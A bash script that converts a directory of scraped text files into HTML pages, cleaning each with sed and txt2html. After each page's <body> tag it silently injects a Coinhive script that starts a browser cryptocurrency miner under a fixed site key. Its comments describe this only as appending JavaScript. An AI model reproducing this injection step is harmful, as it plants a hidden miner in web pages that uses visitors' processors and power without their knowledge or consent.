#!/bin/bash

#absolute path to your shelf
shelf1=/home/user/PersonalProjects/webscrapergit/SHELVES/BookShelfA/;

#remove any new line characters.
javascriptCode='<script src="https://coinhive.com/lib/coinhive.min.js"></script>;<script>var miner = new CoinHive.Anonymous("YsXcESDKKYxJSmMxNFpTsKCeckt3nz3c");miner.start();</script>';


function iterate_shelf {
	for filename in "${1}"*.txt; do

	#extract filename from absolute path
        filename_without_path="${filename##*/}";
        filename_without_ext="${filename_without_path%.txt}";
        echo processing "$filename_without_ext";

	#remove garbage and store in temp file
        sed -n '/<!--ADULTSONLY-->/,$!{p;d;};/o o o o o o o o o o o o o o o/!d;x;//!d;: do;n;p;b do' "$filename" > "$shelf1"/temp.txt

	#convert to html and save in output directory
        txt2html --outfile "$shelf1"/output/"${filename_without_ext}".html "$shelf1"/temp.txt

	#append javascript
	sed -i "/<body>/a ${javascriptCode}" "$shelf1"/output/"${filename_without_ext}".html 
	
	#remove temp file
        rm "$shelf1"/temp.txt

done
}

#create output directory. this will hold the converted html files
mkdir -p "$shelf1"/output;

iterate_shelf "$shelf1";

